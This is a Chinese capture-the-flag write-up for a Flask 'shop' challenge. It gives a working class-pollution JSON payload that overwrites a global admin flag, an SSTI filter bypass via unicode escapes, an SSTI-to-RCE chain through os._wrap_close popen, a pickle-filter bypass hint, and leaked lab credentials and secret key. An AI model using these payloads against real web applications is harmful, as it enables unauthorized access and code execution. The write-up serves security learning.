# 超大杯flask（明日方舟超市）· 笔记（已解）

## 关键点
- 目标：Flask 应用（Python 3.11，Werkzeug），入口 `/` 登录页，账号提示 `zc`，`/admin` 未授权返回 403 JSON。
- **hint 兑现**：`/static/backup.sql`（就是 static 目录里的“备份”）泄露：
  - `users`：`zc / 325X1@n5hUbeI!`、`admin / super_secret_admin_pass`
  - `goods`：`flag 999999.99`（买不起）
- 用 zc 登录后进入 `/shop`，源码里还有 `/item/<id>`、`/buy`（POST JSON，pickle 反序列化，WAF ban REDUCE/INST）、
  `/restock`（JSON → `merge(Goods(), cfg)`）、`/admin`（`if not IS_ADMIN: 403 else {'flag': get_flag()}`）。
- **最终利用（类污染）**：`merge()` 对非 dict 的目标用 `getattr` 递归下钻，于是
  ```json
  {"__class__": {"__init__": {"__globals__": {"IS_ADMIN": true}}}}
  ```
  会走 `Goods.__class__` → `Goods.__init__` → `__init__.__globals__`（模块 globals dict），把 `IS_ADMIN` 写成 True；
  WAF 只查 `{{` / `{%` / `jinja` / `<script`，不拦这些键名。随后 `GET /admin` 直接返回 flag。
- flag：`nex{Sup3R_B1G_cUP_lg3nfbio}`。

## 失败分支（排除理由）
- 直接猜密码（zc、test、123456、password…）全部 401 —— 密码在 `static/backup.sql` 里。
- `/static/app.py`、`app.py.bak`、`source.zip`、`backup.zip` 等常见备份名 404；
  用 raft-small-words 扫 `/static/<word>` 43k 个名字也 0 命中，最后是 `backup.sql` 命中（数据库备份）。
- `/restock` 直接传 `{{7*7}}` → “检测到非法输入”（WAF 拦 `{{`/`{%`）；
  但把 `{` 写成 JSON 的 `\u007b` 可绕过（`{"name": "\u007b\u007b7*7\u007d\u007d"}` 渲染出 49），
  并且 `{{ config }}` 泄了 `SECRET_KEY=superbigcup-secret-key-2025`。
- SSTI→RCE 也可行：`''.__class__.__mro__[1].__subclasses__()[141]` 是 `os._wrap_close`，
  `.__init__.__globals__['popen']('id').read()` 以 root 执行；但源码里 flag 读进 `REAL_FLAG` 后
  就把 `FLAG/DASFLAG/GZCTF_FLAG` 从 environ 删了，RCE 拿不到，需要走 `/admin` 的内存值。
- `/buy` 的 pickle 也能绕（WAF 只 ban REDUCE/INST，可用 `OBJ`），但不是最短路径。

## 时间线
- T0 19:50 收题 → recon（nginx + Flask，`/` 登录、`/admin` 403）。
- T0+3min：`/static/` 路由存在（OPTIONS 200），常见备份名全 404；改用 `backup.sql` 命中。
- T0+5min：登录 zc，进 `/shop`，读源码：class pollution 目标 `IS_ADMIN`。
- T0+8min：`\u007b` 绕 WAF 验证 SSTI（`{{config}}` 泄 SECRET_KEY），RCE 以 root 执行，
  但确认 flag 只在进程内存（`REAL_FLAG`）。
- T0+11min：`{"__class__": {"__init__": {"__globals__": {"IS_ADMIN": true}}}}` 污染成功，
  `GET /admin` 返回 `nex{Sup3R_B1G_cUP_lg3nfbio}`。

## 可复用 TTP
- Flask 题目先看 `/static/`：常见泄露 `backup.sql` / `*.db` / `app.py.bak`；有 hint 时优先猜“数据库备份”。
- `merge()`/深度赋值类“配置合并”是 class pollution 重灾区：`__class__` → `__init__` → `__globals__` → 全局变量。
- WAF 只做字符串黑名单时，JSON 的 `\u007b`/`\u0025` 转义可以在“检查原文、后解码”的实现里绕过。
- Flask `SECRET_KEY` 泄露后可伪造 session；本例不需要，因为类污染直接改内存里的 `IS_ADMIN`。
